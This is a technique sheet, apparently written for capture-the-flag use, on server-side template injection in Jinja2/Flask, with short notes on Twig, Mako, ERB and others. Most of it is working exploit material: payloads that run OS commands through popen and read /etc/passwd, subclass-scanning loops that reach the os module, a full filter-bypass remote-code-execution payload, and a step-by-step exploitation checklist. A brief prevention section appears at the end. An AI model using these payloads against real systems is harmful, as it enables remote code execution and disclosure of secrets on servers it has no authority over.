# ssti

## Metadata

Title: ssti
Tags: ssti, jinja2, python, flask, twig, mako, template-injection, rce, filter-bypass
Technique: ssti

## Concept

SSTI happens when user input reaches a **template engine** (Jinja2, Twig,
Mako, Freemarker, ERB, ...) and is parsed as template source instead of being
output as text.

Difference from XSS:

- XSS: the template engine runs in the **victim's browser**.
- SSTI: the template engine runs on the **server**, and the attacker is the one
  supplying the input.

SSTI is strictly more dangerous: it leads to RCE, file read, environment
secret disclosure (`config`, `SECRET_KEY`), and data exfiltration.

## Detection methodology

### Step 1 - Identify the stack from response headers

- `Werkzeug`, `Python` -> Flask -> Jinja2
- `X-Powered-By: PHP` -> Blade/Twig
- `Server: gunicorn` + Python -> Flask/Django
- `X-AspNet-Version` -> Razor

### Step 2 - Find an injection point

Look for features whose purpose is to render user content: preview, announce,
report, name, email, comment, description.

### Step 3 - Probe with a harmless arithmetic expression

| Payload | Engine | Result |
|---|---|---|
| `{{7*7}}` | Jinja2 / Twig | renders `49` |
| `${7*7}` | JavaScript / Mako | renders `49` |
| `<%= 7*7 %>` | ERB | renders `49` |

Note: `7*7` with no template markers is printed verbatim. Use a marker-free
check to tell reflection from evaluation.

Interpretation:

- renders `49` -> full SSTI, expressions evaluate
- renders `7777777` -> concatenation, weaker position, look elsewhere
- printed verbatim -> not an injection point, keep looking

### Step 4 - Confirm real execution, not reflection

Run a command and read the output back. A rendered `49` proves evaluation but
not yet command execution.

## Dangerous sinks

Python / Jinja2:

- `render_template_string(user_input)` - Flask, by far the most common cause.
- `Template(user_input).render()` and `Environment.from_string(...)`.
- Building a template with concatenation or f-strings that embed request data.

Web frameworks with the same pattern: Flask, Django
(`Template` / `render_to_string`), Jinja2 used directly, and any custom
preview/announce/report feature - these are classic injection points because
they are designed to render user content.

## Payload templates

Detection and introspection:

```text
{{7*7}}
{{config}}
{{request}}
{{''.__class__}}
{{self.__class__.__mro__}}
{{[].__class__.__base__.__subclasses__()}}
```

Command execution through the Jinja globals:

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()}}
```

Reach a module through an object subclass when the globals shortcut is
unavailable:

```text
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% set g = c.__init__.__globals__ %}
  {% if g is defined and 'os' in g %}{{ g['os'].popen('id').read() }}{% break %}{% endif %}
{% endfor %}
```

Reading files without a shell:

```text
{{open('/etc/passwd').read()}}
{{''.__class__.__mro__[-1].__subclasses__()[0]('/etc/passwd').read()}}
```

## Jinja2 - check for a sandbox

| Rendering | Reach |
|---|---|
| `render_template_string(...)` | Full access, the chain above works |
| `Environment(sandboxed=True)` | Attribute and dunder access blocked; look for a sandbox escape |

An unsandboxed environment is what makes `__globals__` reachable. If
`config.__class__` renders empty but `config` renders, the attribute access is
being filtered - that is a sandbox.

## Jinja2 - RCE with NO sandbox

Fastest chain first, try in order:

1. `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
2. `{{lipsum.__globals__['os'].popen('id').read()}}`
3. subclass scan (see the for-loop template above)

If a memorized class index fails, the index has shifted because a different
set of modules was loaded. Search by class name instead of trusting an index,
and print every class whose `__init__.__globals__` contains the module you
need.

## Jinja2 - RCE with a sandbox

When attributes are filtered, look for:

- Built-in filters that reach objects: `|attr()`, `|map`, `|select`
- `config`, `request`, `self`, `session`, `g`, `cycler`, `joiner`, `namespace`
  are still reachable as names even when `__globals__` is not
- A class whose constructor takes `(path, mode)` reads a file; one that takes
  `(cmd, shell=True)` executes

## From detection to RCE - checklist

1. Identify the engine from the stack and response headers.
2. Find a user value that reaches `render_template_string` / `Template(...)`.
3. Probe `{{7*7}}` to confirm evaluation.
4. `{{config}}` to confirm the environment is reachable.
5. Try the globals chain; if it fails, scan subclasses for one whose
   `__init__.__globals__` holds `os`.
6. Execute a command and read the output back.
7. Locate the flag: `find / -maxdepth 4 -iname '*flag*' 2>/dev/null`, then
   `ls -la /` and `ls -la /app /challenge /home`.
8. Read it, then **verify** the read was complete with `wc -c`, `md5sum`,
   `od -c`.

## Practical notes

- **Where does the output go?** If the injected value is only ever shown to
  the submitter, there is no bot to abuse: read the output directly and do not
  build an exfiltration chain. If a hint mentions an admin, viewer or cookie,
  the output is invisible to you and XSS-style exfiltration is required.
- **Redirects are normal.** Many apps POST then redirect (303/307) to a result
  page, and the injection output appears on the *final* page. Always follow the
  redirect before judging a payload. A 307/308 preserves the method, so the
  client must re-POST; 301/302/303 become a GET.
- **One command per request.** Concatenating several commands in one
  expression risks output that carries raw markup and breaks the surrounding
  render (seen as HTTP 500). Isolate commands when output is untrusted.
- **Chunk long output.** A template rendering an entire file or directory
  listing may be truncated by the page; read a slice at a time (`head -c`,
  `sed -n`) and confirm byte counts.

## Blacklist bypass

A very common hardening step is a filter that *removes* characters before
rendering, e.g. `re.sub(r'[_.\[\]]', '', value)`. This defeats the usual
payloads but not the template language itself.

### 1. Characterise the filter, never guess it

Submit one character per request wrapped in known-good text (`A<char>B`) and
diff the output. Two outcomes per character:

- the character disappears -> it is **stripped**
- the whole value is replaced by a taunt -> a **substring rule** or an
  exception handler fired

This turns a guess into a fact in a couple of requests and also reveals
substring rules (an alternation that removes `base` as well, so `base64`
becomes `64`).

### 2. Rebuild blocked characters at runtime

Character-stripping filters see the source text, not the value the template
language finally produces. Rebuild the character inside the template:

```text
{% set u = '%c'|format(95) %}{{ u+u+'class'+u+u }}   ->  __class__
```

`%c` takes a character code, so no literal blocked character ever appears in
the request. The same variable rebuilds every dunder name, and it also works
inside the shell command string when the strip is applied to the whole
request value.

`{% set %}` is used because block tags are usually not filtered. Build names
by concatenation: `u~"name"~u` or `u+u+'name'+u+u`.

### 3. Reach objects with `|attr()` when `.` and `[]` are gone

`attr` is a filter, so it needs no dot:

```text
config|attr('__class__')
```

Two facts decide whether the chain works:

- **In Jinja >= 3.1 `attr` performs `getattr` only** - the item-lookup
  fallback was removed. So `globals_dict|attr('os')` returns Undefined and
  renders as **empty output**. Get dict keys through a dict method instead:
  `|attr('get')('os')`.
- **Calling the result of a filter is valid**: `|attr('read')()` works, which
  removes the need for `.read()`.

Full no-dot, no-bracket, no-underscore RCE template:

```text
{% set u = '%c'|format(95) %}{{ (config|attr(u+u+'class'+u+u)|attr(u+u+'init'+u+u)|attr(u+u+'globals'+u+u)|attr('get')('os')|attr('popen'))('id')|attr('read')() }}
```

Replace `config|attr(...__init__)` with `lipsum|attr(u+u+'globals'+u+u)` or
`cycler|attr(...)` when the app config object is not reachable.

When indexing is blocked too, `|first`, `|last` and `{% for %}` replace `[i]`
and `for x in list`.

### 4. The filter also eats your shell command

The strip runs over the **whole request value**, so the command string is
damaged as well:

- `cat /challenge/app.py` becomes `cat /challenge/apppy` -> the shell writes
  the error to stderr and `popen(...).read()` returns `""`.
- A substring rule such as `base` turns `base64` into `64`.

Fix: rebuild the blocked characters inside the command too. The shell then
receives the real path while the filter only ever saw the escape.

### 5. Silent empty output is a signal

With `popen(...).read()` a failing command yields an **empty render**, not an
error. Treat empty output as "my command was mangled or failed" and re-check
the command string for stripped characters before concluding the target is
empty.

### 6. Blocked characters outside Jinja

- Request-controlled values are echoed back into the template context
  (`request`, `request.args`, `request.headers`, `request.form`): send the
  needed character in a header or query parameter and pull it back out with
  `|attr('get')`. Useful when a *substring* is blocked and escapes cannot
  express it.
- For substring blocks that cannot be escaped, build the name from
  concatenation of surviving pieces plus recovered characters.

## Reading the filter source

When the app already lets you execute code, spend one request reading its own
source (`cat app.py`). It reveals, in a single shot:

- the exact filter expression (which characters and substrings are removed)
- whether a taunting message is a WAF or just `except TemplateSyntaxError`
- where the flag file lives

## Taunting messages are often exception handlers

`Stop trying to break me >:(` style output frequently comes from the
application's own error handling:

```python
try:
    return render_template_string(user_input)
except TemplateSyntaxError:
    return render_template_string("Stop trying to break me >:(")
```

Diagnostic value: it tells you the payload was **mangled into invalid syntax**
rather than explicitly blocked. Distinguish the two cases:

- the message appears -> the payload became a syntax error (characters were
  removed)
- empty output -> the payload parsed fine but produced an undefined or empty
  value (for example a dict key read through a getattr-only `attr` filter)

## Other engines

Do not reuse a Jinja chain blindly on another engine.

| Engine | Probe | Notes |
|---|---|---|
| Twig | `{{7*7}}`, `{{dump()}}` | `dump()` exposes the whole context |
| Mako | `${7*7}` | `${}` markers |
| ERB | `<%= 7*7 %>` | Rails default |
| Freemarker | `${7*7}` | `?new()` built-in can be dangerous |
| Velocity | `#set($x=7*7)` | Java class access is the usual path |

The class-walking technique is specific to Python; other engines expose their
own object models.

## Prevention (server-side)

- Never build a template from user input. Pass data as context variables.
- Keep template engines sandboxed when untrusted input must be shown.
- Prefer fixed templates plus autoscaping.
- Run the application with least privilege - container root makes command
  execution far more powerful than it needs to be.
- Strip nothing by hand: character filters are bypassable, as shown above.
